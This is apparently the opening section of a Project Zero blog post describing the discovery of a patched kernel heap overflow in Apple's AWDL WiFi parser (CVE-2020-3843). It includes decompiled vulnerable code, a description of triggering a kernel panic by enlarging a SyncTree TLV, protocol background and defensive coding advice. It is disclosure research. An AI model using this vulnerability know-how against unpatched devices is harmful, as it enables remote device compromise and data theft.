---
source: p0
source_url: https://projectzero.google/2020/12/an-ios-zero-click-radio-proximity.html
title: "An iOS zero-click radio proximity exploit odyssey - Project Zero"
description: "Posted by Ian Beer, Project ZeroNOTE: This specific issue was fixed before the launch of Privacy-..."
---

Posted by Ian Beer, Project Zero

**NOTE: This specific issue was fixed before the launch of [Privacy-Preserving Contact Tracing](https://covid19.apple.com/contacttracing) in iOS 13.5 in May 2020.**

AWDL Broadcast Denial Of Service - YouTube

Tap to unmute

[AWDL Broadcast Denial Of Service](https://www.youtube.com/watch?v=ikZTNSmbh00) [Ian Beer](https://www.youtube.com/channel/UC-NT5AokdA2-XbI_XHvMwPA)

![thumbnail-image](https://yt3.ggpht.com/ytc/AIdro_ly2S6SGXiVzX-0Xd2O3DtbdHQhH92vlcYxC4mmPK52FsY=s68-c-k-c0x00ffffff-no-rj)

Ian Beer1.62K subscribers

[Watch on](https://www.youtube.com/watch?v=ikZTNSmbh00)

### In this demo I remotely trigger an unauthenticated kernel memory corruption vulnerability which causes all iOS devices in radio-proximity to reboot, with no user interaction. Over the next 30'000 words I'll cover the entire process to go from this basic demo to successfully exploiting this vulnerability in order to run arbitrary code on any nearby iOS device and steal all the user data

# Introduction

Quoting [@halvarflake's Offensivecon keynote](https://docs.google.com/presentation/d/1YcBqgccBcdn5-v80OX8NTYdu_-qRmrwfejlEx6eq-4E/edit#slide=id.g7dd52a5bec_0_842) from February 2020:

"Exploits are the closest thing to "magic spells" we experience in the real world: Construct the right incantation, gain remote control over device."

For 6 months of 2020, while locked down in the corner of my bedroom surrounded by my lovely, screaming children, I've been working on a magic spell of my own. No, sadly not an incantation to convince the kids to sleep in until 9am every morning, but instead a wormable radio-proximity exploit which allows me to gain complete control over any iPhone in my vicinity. View all the photos, read all the email, copy all the private messages and monitor everything which happens on there in real-time.

The takeaway from this project should not be: no one will spend six months of their life just to hack my phone, I'm fine.

Instead, it should be: one person, working alone in their bedroom, was able to build a capability which would allow them to seriously compromise iPhone users they'd come into close contact with.

Imagine the sense of power an attacker with such a capability must feel. As we all pour more and more of our souls into these devices, an attacker can gain a treasure trove of information on an unsuspecting target.

What's more, with [directional antennas](https://www.wikihow.com/Make-a-Cantenna), higher transmission powers and sensitive receivers the range of such attacks can be considerable.

I have no evidence that these issues were exploited in the wild; I found them myself through manual reverse engineering. But we do know that exploit vendors seemed to take notice of these fixes. For example, take this tweet from Mark Dowd, the co-founder of [Azimuth Security](https://www.azimuthsecurity.com/), an Australian "market-leading information security business":

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMNd9_s1156_image18%281%29.png)

### This tweet from @mdowd on May 27th 2020 mentioned a double free in BSS reachable via AWDL

The vulnerability Mark is referencing here is one of the vulnerabilities I reported to Apple. You don't notice a fix like that without having a deep interest in this particular code.

[This Vice article from 2018](https://www.vice.com/en_us/article/8xdayg/iphone-zero-days-inside-azimuth-security) gives a good overview of Azimuth and why they might be interested in such vulnerabilities. You might trust that Azimuth's judgement of their customers aligns with your personal and political beliefs, you might not, that's not the point. Unpatched vulnerabilities aren't like physical territory, occupied by only one side. Everyone can exploit an unpatched vulnerability and Mark Dowd wasn't the only person to start tweeting about vulnerabilities in AWDL.

This has been the longest solo exploitation project I've ever worked on, taking around half a year. But it's important to emphasize up front that the teams and companies supplying the global trade in cyberweapons like this one aren't typically just individuals working alone. They're well-resourced and focused teams of collaborating experts, each with their own specialization. They aren't starting with absolutely no clue how bluetooth or wifi work. They also potentially have access to information and hardware I simply don't have, like [development devices](https://www.vice.com/en/article/gyakgw/the-prototype-dev-fused-iphones-that-hackers-use-to-research-apple-zero-days), [special cables](https://www.theiphonewiki.com/wiki/Kong_Cable), leaked source code, symbols files and so on.

Of course, an iPhone isn't designed to allow people to build capabilities like this. So what went so wrong that it was possible? Unfortunately, it's the same old story. A fairly trivial buffer overflow programming error in C++ code in the kernel parsing untrusted data, exposed to remote attackers.

In fact, this entire exploit uses just a single memory corruption vulnerability to compromise the flagship iPhone 11 Pro device. With just this one issue I was able to defeat all the mitigations in order to remotely gain native code execution and kernel memory read and write.

Relative to the size and complexity of these codebases of major tech companies, the sizes of the security teams dedicated to proactively auditing their product's source code to look for vulnerabilities are very small. Android and iOS are complete custom tech stacks. It's not just kernels and device drivers but dozens of attacker-reachable apps, hundreds of services and thousands of libraries running on devices with customized hardware and firmware.

Actually reading all the code, including every new line in addition to the decades of legacy code, is unrealistic, at least with the division of resources commonly seen in tech where the ratio of security engineers to developers might be 1:20, 1:40 or even higher.

To tackle this insurmountable challenge, security teams rightly place a heavy emphasis on design level review of new features. This is sensible: getting stuff right at the design phase can help limit the impact of the mistakes and bugs which will inevitably occur. For example, ensuring that a new hardware peripheral like a GPU can only ever access a restricted portion of physical memory helps constrain [the worst-case outcome if the GPU is compromised by an attacker](https://projectzero.google/2020/09/attacking-qualcomm-adreno-gpu.html). The attacker is hopefully forced to find an additional vulnerability to "lengthen the exploit chain", having to use an ever-increasing number of vulnerabilities to hack a single device. Retrofitting constraints like this to already-shipping features would be much harder, if not impossible.

In addition to design-level reviews, security teams tackle the complexity of their products by attempting to constrain what an attacker might be able to do with a vulnerability. These are mitigations. They take many forms and can be general, like [stack cookies](https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check?view=vs-2019) or application specific, like [Structure ID in JavaScriptCore](https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf). The guarantees which can be made by mitigations are generally weaker than those made by design-level features but the goal is similar: to "lengthen the exploit chain", hopefully forcing an attacker to find a new vulnerability and incur some cost.

The third approach widely used by defensive teams is fuzzing, which attempts to emulate an attacker's vulnerability finding process with brute force. Fuzzing is often misunderstood as an effective method to discover easy-to-find vulnerabilities or "low-hanging fruit". A more precise description would be that fuzzing is an effective method to discover easy-to-fuzz vulnerabilities. Plenty of vulnerabilities which a skilled vulnerability researcher would consider low-hanging fruit can require reaching a program point that no fuzzer today will be able to reach, no matter the compute resources used.

The problem for tech companies and certainly not unique to Apple, is that while design review, mitigations, and fuzzing are necessary for building secure codebases, they are far from sufficient.

Fuzzers cannot reason about code in the same way a skilled vulnerability researcher can. This means that without concerted manual effort, vulnerabilities with a relatively low cost-of-discovery remain fairly prevalent. A major focus of my work over the last few years had been attempting to highlight that the iOS codebase, just like any other major modern operating system, has a high vulnerability density. Not only that, but there's a high density of "good bugs", that is, vulnerabilities which enable the creation of powerful weird machines.

This notion of "good bugs" is something that offensive researchers understand intuitively but something which might be hard to grasp for those without an exploit development background. [Thomas Dullien's weird machines paper](https://ieeexplore.ieee.org/document/8226852) provides the best introduction to the notion of weird machines and their applicability to exploitation. Given a sufficiently complex state machine operating on attacker-controlled input, a "good bug" allows the attacker-controlled input to instead become "code", with the "good bug" introducing a new, unexpected state transition into a new, unintended state machine. The art of exploitation then becomes the art of determining how one can use vulnerabilities to introduce sufficiently powerful new state transitions such that, as an end goal, the attacker-supplied input becomes code for a new, weird machine capable of arbitrary system interactions.

It's with this weird machine that mitigations will be defeated; even a mitigation without implementation flaws is usually no match for a sufficiently powerful weird machine. An attacker looking for vulnerabilities is looking specifically for weird machine primitives. Their auditing process is focused on a particular attack-surface and particular vulnerability classes. This stands in stark contrast to a product security team with responsibility for every possible attack surface and every vulnerability class.

As things stand now in November 2020, I believe it's still quite possible for a motivated attacker with just one vulnerability to build a sufficiently powerful weird machine to completely, remotely compromise top-of-the-range iPhones. In fact, the parts of that process which are hardest probably aren't those which you might expect, at least not without an appreciation for weird machines.

Vulnerability discovery remains a fairly linear function of time invested. Defeating mitigations remains a matter of building a sufficiently powerful weird machine. Concretely, Pointer Authentication Codes (PAC) meant I could no longer take the popular direct shortcut to a very powerful weird machine via trivial program counter control and ROP or JOP. Instead I built a remote arbitrary memory read and write primitive which in practise is just as powerful and something which the current implementation of PAC, which focuses almost exclusively on restricting control-flow, wasn't designed to mitigate.

Secure system design didn't save the day because of the inevitable tradeoffs involved in building shippable products. Should such a complex parser driving multiple, complex state machines really be running in kernel context against untrusted, remote input? Ideally, no, and this was almost certainly flagged during a design review. But there are tight timing constraints for this particular feature which means isolating the parser is non-trivial. It's certainly possible, but that would be a major engineering challenge far beyond the scope of the feature itself. At the end of the day, it's features which sell phones and this feature is undoubtedly very cool; I can completely understand the judgement call which was made to allow this design despite the risks.

But risk means there are consequences if things don't go as expected. When it comes to software vulnerabilities it can be hard to connect the dots between those risks which were accepted and the consequences. I don't know if I'm the only one who found these vulnerabilities, though I'm the first to tell Apple about them and work with Apple to fix them. Over the next 30'000 words I'll show you what I was able to do with a single vulnerability in this attack surface and hopefully give you a new or renewed insight into the power of the weird machine.

I don't think all hope is lost; there's just an awful lot more left to do. In the conclusion I'll try to share some ideas for what I think might be required to build a more secure iPhone.

If you want to follow along you can find details [attached to issue 1982](https://bugs.chromium.org/p/project-zero/issues/detail?id=1982) in the Project Zero issue tracker.

# Vulnerability discovery

In 2018 [Apple shipped an iOS beta build without stripping function name symbols](https://twitter.com/s1guza/status/1093424833088622592) from the kernelcache. While this was almost certainly an error, events like this help researchers on the defending side enormously. One of the ways I like to procrastinate is to scroll through this enormous list of symbols, reading bits of assembly here and there. One day I was looking through IDA's cross-references to memmove with no particular target in mind when something jumped out as being worth a closer look:

[![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhwjgZ_s1200_image32.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhwjgZ_s1894_image32.png)

### IDA Pro's cross references window shows a large number of calls to memmove. A callsite in IO80211AWDLPeer::parseAwdlSyncTreeTLV is highlighted

Having function names provides a huge amount of missing context for the vulnerability researcher. A completely stripped 30+MB binary blob such as the iOS kernelcache can be overwhelming. There's a huge amount of work to determine how everything fits together. What bits of code are exposed to attackers? What sanity checking is happening and where? What execution context are different parts of the code running in?

In this case this particular driver is also available on MacOS, where function name symbols are not stripped.

There are three things which made this highlighted function stand out to me:

1) The function name:

#### IO80211AWDLPeer::parseAwdlSyncTreeTLV

At this point, I had no idea what AWDL was. But I did know that TLVs (Type, Length, Value) are often used to give structure to data, and parsing a TLV might mean it's coming from somewhere untrusted. And the [80211](https://en.wikipedia.org/wiki/IEEE_802.11) is a giveaway that this probably has something to do with WiFi. Worth a closer look. Here's the raw decompilation from [Hex-Rays](https://www.hex-rays.com/products/decompiler/) which we'll clean up later:

#### \_\_int64 \_\_fastcall IO80211AWDLPeer::parseAwdlSyncTreeTLV(\_\_int64 this, \_\_int64 buf)

#### {

#### const void \*v3; // x20

#### \_DWORD \*v4; // x21

#### int v5; // w8

#### unsigned \_\_int16 v6; // w25

#### unsigned \_\_int64 some\_u16; // x24

#### int v8; // w21

#### \_\_int64 v9; // x8

#### \_\_int64 v10; // x9

#### unsigned \_\_int8 \*v11; // x21

#### v3 = (const void \*)(buf + 3);

#### v4 = (\_DWORD \*)(this + 1203);

#### v5 = \*(\_DWORD \*)(this + 1203);

#### if ( ((v5 + 1) & 0xFFFFu) <= 0xA )

#### v6 = v5 + 1;

#### else

#### v6 = 10;

#### some\_u16 = \*(unsigned \_\_int16 \*)(buf + 1) / 6uLL;

#### if ( (\_DWORD)some\_u16 == v6 )

#### {

#### some\_u16 = v6;

#### }

#### else

#### {

#### IO80211Peer::logDebug(

#### this,

#### 0x8000000000000uLL,

#### "Peer %02X:%02X:%02X:%02X:%02X:%02X: PATH LENGTH error hc %u calc %u \\n",

#### \*(unsigned \_\_int8 \*)(this + 32),

#### \*(unsigned \_\_int8 \*)(this + 33),

#### \*(unsigned \_\_int8 \*)(this + 34),

#### \*(unsigned \_\_int8 \*)(this + 35),

#### \*(unsigned \_\_int8 \*)(this + 36),

#### \*(unsigned \_\_int8 \*)(this + 37),

#### v6,

#### some\_u16);

#### \*v4 = some\_u16;

#### v6 = some\_u16;

#### }

#### v8 = memcmp((const void \*)(this + 5520), v3, (unsigned int)(6 \* some\_u16));

#### memmove((void \*)(this + 5520), v3, (unsigned int)(6 \* some\_u16));

Definitely looks like it's parsing something. There's some fiddly byte manipulation; something which sort of looks like a bounds check and an error message.

2) The second thing which stands out is the error message string:

#### "Peer %02X:%02X:%02X:%02X:%02X:%02X: PATH LENGTH error hc %u calc %u\\n"

Any kind of LENGTH error sounds like fun to me. Especially when you look a little closer...

3) The control flow graph.

Reading the code a bit more closely it appears that although the log message contains the word "error" there's nothing which is being treated as an error condition here. IO80211Peer::logDebug isn't a fatal logging API, it just logs the message string. Tracing back the length value which is passed to memmove, regardless of which path is taken we still end up with what looks like an arbitrary u16 value from the input buffer (rounded down to the nearest multiple of 6) passed as the length argument to memmove.

Can it really be this easy? Typically, in my experience, bugs this shallow in real attack surfaces tend to not work out. There's usually a length check somewhere far away; you'll spend a few days trying to work out why you can't seem to reach the code with a bad size until you find it and realize this was a CVE from a decade ago. Still, worth a try.

But what even is this attack surface?

# A first proof-of-concept

A bit of googling later we learn that [awdl is a type of welsh poetry](https://en.wikipedia.org/wiki/Awdl), and also an acronym for an Apple-proprietary mesh networking protocol probably called Apple Wireless Direct Link. It appears to be used by [AirDrop](https://support.apple.com/en-us/HT204144) amongst other things.

The first goal is to determine whether we can really trigger this vulnerability remotely.

We can see from the casts in the parseAwdlSyncTreeTLV method that the type-length-value objects have a single-byte type then a two-byte length followed by a payload value.

In IDA selecting the function name and going View -> Open subviews -> Cross references (or pressing 'x') shows IDA only found one caller of this method:

#### IO80211AWDLPeer::actionFrameReport

#### ...

#### case 0x14u:

#### if (v109\[20\] >= 2)

#### goto LABEL\_126;

#### ++v109\[0x14\];

#### IO80211AWDLPeer::parseAwdlSyncTreeTLV(this, bytes);

So 0x14 is probably the type value, and v109 looks like it's probably counting the number of these TLVs.

Looking in the list of function names we can also see that there's a corresponding BuildSyncTreeTlv method. If we could get two machines to join an AWDL network, could we just use the MacOS kernel debugger to make the SyncTree TLV very large before it's sent?

Yes, you can. Using two MacOS laptops and enabling AirDrop on both of them I used a kernel debugger to edit the SyncTree TLV sent by one of the laptops, which caused the other one to kernel panic due to an out-of-bounds memmove.

If you're interested in exactly how to do that take a look at the [original vulnerability report](https://bugs.chromium.org/p/project-zero/issues/detail?id=1982) I sent to Apple on November 29th 2019. This vulnerability was fixed as CVE-2020-3843 on January 28th 2020 in iOS 13.1.1/MacOS 10.15.3.

Our journey is only just beginning. Getting from here to running an implant on an iPhone 11 Pro with no user interaction is going to take a while...

# Prior Art

There are a series of papers from the [Secure Mobile Networking Lab at TU Darmstadt](https://www.informatik.tu-darmstadt.de/seemoo/seemoo/index.en.jsp) in Germany (also known as SEEMOO) which look at AWDL. The researchers there have done a considerable amount of reverse engineering (in addition to having access to some leaked Broadcom source code) to produce these papers; they are invaluable to understand AWDL and pretty much the only resources out there.

The first paper [One Billion Apples’ Secret Sauce: Recipe for the Apple Wireless Direct Link Ad hoc Protocol](https://arxiv.org/pdf/1808.03156.pdf) covers the format of the frames used by AWDL and the operation of the channel-hopping mechanism.

The second paper [A Billion Open Interfaces for Eve and Mallory: MitM, DoS, and Tracking Attacks on iOS and macOS Through Apple Wireless Direct Link](https://www.usenix.org/system/files/sec19fall_stute_prepub.pdf) focuses more on Airdrop, one of the OS features which uses AWDL. This paper also examines how Airdrop uses Bluetooth Low Energy advertisements to enable AWDL interfaces on other devices.

The research group wrote an open source AWDL client called [OWL](https://github.com/seemoo-lab/owl) (Open Wireless Link). Although I was unable to get OWL to work it was nevertheless an invaluable reference and I did use some of their frame definitions.

# What is AWDL?

AWDL is an Apple-proprietary mesh networking protocol designed to allow Apple devices like iPhones, iPads, Macs and Apple Watches to form ad-hoc peer-to-peer mesh networks. Chances are that if you own an Apple device you're creating or connecting to these transient mesh networks multiple times a day without even realizing it.

If you've ever used Airdrop, streamed music to your Homepod or Apple TV via Airplay or used your iPad as a secondary display with Sidecar then you've been using AWDL. And even if you haven't been using those features, if people nearby have been then it's quite possible your device joined the AWDL mesh network they were using anyway.

AWDL isn't a custom radio protocol; the radio layer is WiFi (specifically 802.11g and 802.11a).

Most people's experience with WiFi involves connecting to an infrastructure network. At home you might plug a WiFi access point into your modem which creates a WiFi network. The access point broadcasts a network name and accepts clients on a particular channel.

To reach other devices on the internet you send WiFi frames to the access point (1). The access point sends them to the modem (2) and the modem sends them to your ISP (3,4) which sends them to the internet:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisf7X_s624_image27.png)

### The topology of a typical home network

To reach other devices on your home WiFi network you send WiFi frames to the access point and the access point relays them to the other devices:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCVYc_s624_image5%288%29.png)

### WiFi clients communicate via an access point, even if they are within WiFi range of each other

In reality the wireless signals don't propagate as straight lines between the client and access point but spread out in space such that the two client devices may be able to see the frames transmitted by each other to the access point.

If WiFi client devices can already send WiFi frames directly to each other, then why have the access point at all? Without the complexity of the access point you could certainly have much more magical experiences which "just work", requiring no physical setup.

There are various protocols for doing just this, each with their own tradeoffs. [Tunneled Direct Link Setup](https://en.wikipedia.org/wiki/TDLS) (TDLS) allows two devices already on the same WiFi network to negotiate a direct connection to each other such that frames won't be relayed by the access point.

[Wi-Fi Direct](https://en.wikipedia.org/wiki/Wi-Fi_Direct) allows two devices not already on the same network to establish an encrypted peer-to-peer Wi-Fi network, using [WPS](https://en.wikipedia.org/wiki/Wi-Fi_Protected_Setup) to bootstrap a WPA2-encrypted ad-hoc network.

Apple's AWDL doesn't require peers to already be on the same network to establish a peer-to-peer connection, but unlike Wi-Fi Direct, AWDL has no built-in encryption. Unlike TDLS and Wi-Fi Direct, AWDL networks can contain more than two peers and they can also form a mesh network configuration where multiple hops are required.

AWDL has one more trick up its sleeve: an AWDL client can be connected to an AWDL mesh network and a regular AP-based infrastructure network at the same time, using only one Wi-Fi chipset and antenna. To see how that works we need to look a little more at some Wi-Fi fundamentals.

|     |     |     |     |
| --- | --- | --- | --- |
|  | TDLS | Wi-Fi Direct | AWDL |
| Requires AP network | Yes | No | No |
| Encrypted | Yes | Yes | No |
| Peer Limit | 2 | 2 | Unlimited |
| Concurrent AP Connection Possible | No | No | Yes |

# WiFi fundamentals

There are over 20 years of WiFi standards spanning different frequency ranges of the electromagnetic spectrum, from as low as [54MHz in 802.11af](https://en.wikipedia.org/wiki/IEEE_802.11af) up to over [60GHz in 802.11ad](https://en.wikipedia.org/wiki/IEEE_802.11ad). Such networks are quite esoteric and consumer equipment uses frequencies near 2.4 Ghz or 5 Ghz. Ranges of frequencies are split into channels: for example in [802.11g](https://en.wikipedia.org/wiki/IEEE_802.11g-2003) channel 6 means a 22 Mhz range between 2.426 GHz and 2.448 GHz.

Newer 5 GHz standards like 802.11ac allow for wider channels up to 160 MHz; 5 Ghz channel numbers therefore encode both the center frequency and channel width. Channel 44 is a 20 MHz range between 5.210 Ghz and 5.230 Ghz whereas channel 46 is a 40 Mhz range which starts at the same lower frequency as channel 44 of 5.210 GHz but extends up to 5.250 GHz.

AWDL typically sends and receives frames on channel 6 and 44. How does that work if you're also using your home WiFi network on a different channel?

# Channel Hopping and Time Division Multiplexing

In order to appear to be connected to two separate networks on separate frequencies at the same time, AWDL-capable devices split time into 16ms chunks and tell the WiFi controller chip to quickly switch between the channel for the infrastructure network and the channel being used by AWDL:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHKWb_s624_image17%281%29.png)

### A typical AWDL channel hopping sequence, alternating between small periods on AWDL social channels and longer periods on the AP channel

The actual channel sequence is dynamic. Peers broadcast their channel sequences and adapt their own sequence to match peers with which they wish to communicate. The periods when an AWDL peer is listening on an AWDL channel are known as Availability Windows.

In this way the device can appear to be connected to the access point whilst also participating in the AWDL mesh at the same time. Of course, frames might be missed from both the AP and the AWDL mesh but the protocols are treating radio as an unreliable transport anyway so this only really has an impact on throughput. A large part of the AWDL protocol involves trying to synchronize the channel switching between peers to improve throughput.

The [SEEMOO labs paper](https://arxiv.org/pdf/1808.03156.pdf) has a much more detailed look at the AWDL channel hopping mechanism.

# AWDL frames

These are the first software-controlled fields which go over the air in a WiFi frame:

struct ieee80211\_hdr {

uint16\_t frame\_control;

uint16\_t duration\_id;

struct ether\_addr dst\_addr;

struct ether\_addr src\_addr;

struct ether\_addr bssid\_addr;

uint16\_t seq\_ctrl;

} \_\_attribute\_\_((packed));

The first word contains fields which [define the type of this frame](https://en.wikipedia.org/wiki/802.11_Frame_Types). These are broadly split into three frame families: Management, Control and Data. The building blocks of AWDL use a subtype of Management frames called [Action frames](https://mrncciew.com/2014/10/09/802-11-mgmt-action-frames/).

The address fields in an 802.11 header can have different meanings depending on the context; for our purposes the first is the destination device MAC address, the second is the source device MAC and the third is the MAC address of the infrastructure network access point or BSSID.

Since AWDL is a peer-to-peer network and doesn't use an access point, the BSSID field of an AWDL frame is set to the hard-coded AWDL BSSID MAC of 00:25:00:ff:94:73. It's this BSSID which AWDL clients are looking for when they're trying to find other peers. Your router won't accidentally use this BSSID because Apple owns the 00:25:00 [OUI](https://en.wikipedia.org/wiki/Organizationally_unique_identifier).

The format of the bytes following the header depends on the frame type. For an Action frame the next byte is a category field. There are [a large number of categories](https://mrncciew.com/2014/10/09/802-11-mgmt-action-frames/) which allow devices to exchange all kinds of information. For example category 5 covers [various types of radio measurements](https://blogs.cisco.com/networking/why-the-802-11k-and-neighbor-report-are-important) like noise histograms.

The special category value 0x7f defines this frame as a vendor-specific action frame meaning that the next three bytes are the OUI of the vendor responsible for this custom action frame format.

[Apple owns the OUI 0x00 0x17 0xf2](https://www.wireshark.org/tools/oui-lookup.html) and this is the OUI used for AWDL action frames. Every byte in the frame after this is now proprietary, defined by Apple rather than an IEEE standard.

The SEEMOO labs team have done a great job reversing the AWDL action frame format and [they developed a wireshark dissector](https://github.com/seemoo-lab/wireshark-awdl).

AWDL Action frames have a fixed-sized header followed by a variable length collection of TLVs:

![](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHSzj_s614_image28.png)

### The layout of fields in an AWDL frame: 802.11 header, action frame header, AWDL fixed header and variable length AWDL payload

Each TLV has a single-byte type followed by a two-byte length which is the length of the variable-sized payload in bytes.

There are two types of AWDL action frame: Master Indication Frames (MIF) and Periodic Synchronization Frames (PSF). They differ only in their type field and the collection of TLVs they contain.

An AWDL mesh network has a single master node decided by an election process. Each node broadcasts a MIF containing a master metric parameter; the node with the highest metric becomes the master node. It is this master node's PSF timing values which should be adopted as the true timing values for all the other nodes to synchronize to; in this way their availability windows can overlap and the network can have a higher throughput.

# Frame processing

Back in 2017, Project Zero researcher Gal Beniamini published a seminal 5-part blog post series entitled [Over The Air](https://projectzero.google/2017/04/over-air-exploiting-broadcoms-wi-fi_4.html) where he exploited a vulnerability in the Broadcom WiFi chipset to gain native code execution on the WiFi controller, then pivoted via an iOS kernel bug in the chipset-to-Application Processor interface to achieve arbitrary kernel memory read/write.

In that case, Gal targeted a vulnerability in the Broadcom firmware when it was parsing data structures related to TDLS. The raw form of these data structures was handled by the chipset firmware itself and never made it to the application processor.

In contrast, for AWDL the frames appear to be parsed in their entirety on the Application Processor by the kernel driver. Whilst this means we can explore a lot of the AWDL code, it also means that we're going to have to build the entire exploit on top of primitives we can build with the AWDL parser, and those primitives will have to be powerful enough to remotely compromise the device. Apple continues to ship new mitigations with each iOS release and hardware revision, and we're of course going to target the latest iPhone 11 Pro with the largest collection of these mitigations in place.

Can we really build something powerful enough to remotely defeat kernel pointer authentication just with a linear heap overflow in a WiFi frame parser? Defeating mitigations usually involves building up a library of tricks to help build more and more powerful primitives. You might start with a linear heap overflow and use it to build an arbitrary read, then use that to help build an arbitrary bit flip primitive and so on.

I've built a library of tricks and techniques like this for doing local privilege escalations on iOS but I'll have to start again from scratch for this brand new attack surface.

# A brief tour of the AWDL codebase

The first two C++ classes to familiarize ourselves with are IO80211AWDLPeer and IO80211AWDLPeerManager. There's one IO80211AWDLPeer object for each AWDL peer which a device has recently received a frame from. A background timer destroys inactive IO80211AWDLPeer objects. There's a single instance of the IO80211AWDLPeerManager which is responsible for orchestrating interactions between this device and other peers.

Note that although we have some function names from the iOS 12 beta 1 kernelcache and the MacOS IO80211Family driver we don't have object layout information. Brandon Azad pointed out that the MacOS prelinked kernel image does contain some structure layout information in the \_\_CTF.\_\_ctf section which can be parsed by the dtrace ctfdump tool. Unfortunately this seems to only contain structures from the open source XNU code.

The sizes of [OSObject-based](https://developer.apple.com/documentation/kernel/osobject?language=objc) [IOKit](https://developer.apple.com/documentation/iokit) objects can easily be determined statically but the names and types of individual fields cannot. One of the most time-consuming tasks of this whole project was the painstaking process of reverse engineering the types and meanings of a huge number of the fields in these objects. Each IO80211AWDLPeer object is almost 6KB; that's a lot of potential fields. Having structure layout information would probably have saved months.

If you're a defender building a threat model don't interpret this the wrong way: I would assume any competent real-world exploit development team has this information; either from [images or devices with full debug symbols](https://developer.ibm.com/technologies/systems/articles/au-dwarf-debug-format/) they have acquired with or without Apple's consent, insider access, or even just from monitoring every single firmware image ever publicly released to [check whether debug symbols were released by accident](https://projectzero.google/2019/10/the-story-of-adobe-reader-symbols.html). Larger groups could even have people dedicated to building custom reversing tools.

Six years ago I had hoped Project Zero would be able to get legitimate access to data sources like this. Six years later and I am still spending months reversing structure layouts and naming variables.

We'll take IO80211AWDLPeerManager::actionFrameInput as the point where untrusted raw AWDL frame data starts being parsed. There is actually a separate, earlier processing layer in the WiFi chipset driver but its parsing is minimal.

Each frame received while the device is listening on a social channel which was sent to the AWDL BSSID ends up at actionFrameInput, wrapped in an mbuf structure. Mbufs are an anachronistic data structure used for wrapping collections of networking buffers. [The mbuf API is the stuff of nightmares](https://securitylab.github.com/research/apple-xnu-icmp-error-CVE-2018-4407), but that's not in scope for this blogpost.

The mbuf buffers are concatenated to get a contiguous frame in memory for parsing, then IO80211PeerManager::findPeer is called, passing the source MAC address from the received frame:

#### IO80211AWDLPeer\*

#### IO80211PeerManager::findPeer(struct ether\_addr \*peer\_mac)

If an AWDL frame has recently been received from this source MAC then this function returns a pointer to an existing IO80211AWDLPeer structure representing the peer with that MAC. The IO80211AWDLPeerManager uses a fairly complicated priority queue data structure called IO80211CommandQueue to store pointers to these currently active peers.

If the peer isn't found in the IO80211AWDLPeerManager's queue of peers then a new IO80211AWDLPeer object is allocated to represent this new peer and it's inserted into the IO80211AWDLPeerManager's peers queue.

Once a suitable peer object has been found the IO80211AWDLPeerManager then calls the actionFrameReport method on the IO80211AWDLPeer so that it can handle the action frame.

This method is responsible for most of the AWDL action frame handling and contains most of the untrusted parsing. It first updates some timestamps then reads various fields from TLVs in the frame using the IO80211AWDLPeerManager::getTlvPtrForType method to extract them directly from the mbuf. After this initial parsing comes the main loop which takes each TLV in turn and parses it.

First each TLV is passed to IO80211AWDLPeer::tlvCheckBounds. This method has a hardcoded list of specific minimum and maximum TLV lengths for some of the supported TLV types. For types not explicitly listed it enforces a maximum length of 1024 bytes. I mentioned earlier that I often encounter code constructs which look like shallow memory corruption only to later discover a bounds check far away. This is exactly that kind of construct, and is in fact where Apple added a bounds check in the patch.

Type 0x14 (which has the vulnerability in the parser) isn't explicitly listed in tlvCheckBounds so it gets the default upper length limit of 1024, significantly larger than the 60 byte buffer allocated for the destination buffer in the IO80211AWDLPeer structure.

This pattern of separating bounds checks away from parsing code is fragile; it's too easy to forget or not realize that when adding code for a new TLV type it's also a requirement to update the tlvCheckBounds function. If this pattern is used, try to come up with a way to enforce that new code must explicitly declare an upper bound here. One option could be to ensure an enum is used for the type and wrap the tlvCheckBounds method in a pragma to temporarily enable clang's [-Wswitch-enum](https://clang.llvm.org/docs/DiagnosticsReference.html#wswitch-enum) warning as an error:

#### \#pragma clang diagnostic push

#### \#pragma diagnostic error "-Wswitch-enum"

#### IO80211AWDLPeer::tlvCheckBounds(...) {

#### switch(tlv->type) {

#### case type\_a:

#### ...;

#### case type\_b:

#### ...;

#### }  }

#### \#pragma clang diagnostic pop

This causes a compilation error if the switch statement doesn't have an explicit case statement for every value of the tlv->type enum.

Static analysis tools like [Semmle](https://semmle.com/) can also help here. The [EnumSwitch](https://help.semmle.com/qldoc/cpp/semmle/code/cpp/stmts/Stmt.qll/type.Stmt$EnumSwitch.html) class can be used like in [this example code](https://help.semmle.com/wiki/display/CCPPOBJ/Missing+enum+case+in+switch) to check whether all enum values are explicitly handled.

If the tlvCheckBounds checks pass then there is a switch statement with a case to parse each supported TLV:

|     |     |
| --- | --- |
| Type | Handler |
| 0x02 | IO80211AWDLPeer::processServiceResponseTLV |
| 0x04 | IO80211AWDLPeer::parseAwdlSyncParamsTlvAndTakeAction |
| 0x05 | IO80211AWDLPeer::parseAwdlElectionParamsV1 |
| 0x06 | inline parsing of serviceParam |
| 0x07 | IO80211Peer::parseHTCapTLV |
| 0x0c | nop |
| 0x10 | inline parsing of ARPA |
| 0x11 | IO80211Peer::parseVhtCapTLV |
| 0x12 | IO80211AWDLPeer::parseAwdlChanSeqFromChanSeqTLV |
| 0x14 | IO80211AWDLPeer::parseAwdlSyncTreeTLV |
| 0x15 | inline parser extracting 2 bytes |
| 0x16 | IO80211AWDLPeer::parseBloomFilterTlv |
| 0x17 | inlined parser of NSync |
| 0x1d | IO80211AWDLPeer::parseBssSteeringTlv |

# SyncTree vulnerability in context

Here's a cleaned up decompilation of the relevant portions of the parseAwdlSyncTreeTLV method which contains the vulnerability:

#### int

#### IO80211AWDLPeer::parseAwdlSyncTreeTLV(awdl\_tlv\* tlv)

#### {

#### u64 new\_sync\_tree\_size;

